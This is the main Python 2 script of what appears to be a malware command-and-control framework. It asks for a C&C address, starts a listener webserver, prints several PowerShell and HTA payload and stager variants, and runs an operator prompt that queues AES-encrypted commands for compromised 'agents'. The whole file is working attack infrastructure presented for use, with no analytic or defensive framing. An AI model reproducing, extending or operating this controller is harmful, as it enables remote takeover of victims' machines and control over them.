# Embedded file name: muddyc3.py
import signal
import sys
import time
try:
    from core import config
except ImportError:
    print "run : python start_campaign.py to intialize the configuration"
    exit()
from core.payloads import *
from core import webserver
from core import header
from core.cmd import cmd
from core.config import *
#from core.config  import *
from core.color import bcolors
from core.Encryption import *
from core.config import AESKey
import urllib2
import threading
def signal_handler(sig, frame):
        print('Exit by typing exit')
        #sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    header.Banner()
    #config.set_key()
    CC = []
    if config.HOST=="" or config.PORT=="":
        while len(CC) == 0:
            CC = raw_input('Enter a DN/IP:port for C&C: ip:port: ')
        CC = CC.split(':')
        config.set_port(CC[1])
        config.set_ip(CC[0])
    #proxy = raw_input('Enter PROXY:')
    #if proxy:
    #    ip = proxy
    server = threading.Thread(target=webserver.main, args=())
    server.start()
    time.sleep(0.5)
    print '+' + '-' * 60 + '+'
    cmd().help()
    print '+' + '-' * 60 + '+'
    print bcolors.OKBLUE + '(LOW):' + bcolors.ENDC
    hta_paylods()
    print bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC
    pwsh_job()
    print bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC
    pwsh_file()
    pwsh_sct()
    simple_payloads()
    pwsh_base64()
    pwsh_base52()
    print '+' + '-' * 60 + '+'

    config.PAYLOAD()
    config.STAGER()
    cspayload()
    while True:
        if config.POINTER == 'main':
            command = raw_input('(%s : %s) ' % (config.BASE, config.POINTER))
        else:
            command = raw_input('(%s : Agent(%s)-%s) ' % (config.BASE, str(config.AGENTS[config.POINTER][0]), config.AGENTS[config.POINTER][1]))
        bcommand = command.strip().split()
        if bcommand:
            if bcommand[0] in cmd.COMMANDS:
                result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main':
                config.COMMAND[config.POINTER].append(encrypt(AESKey,command.strip()))


if __name__ == '__main__':
    try :
        main()
    except Exception as e:
        print '[-] ERROR(main): %s' % str(e)
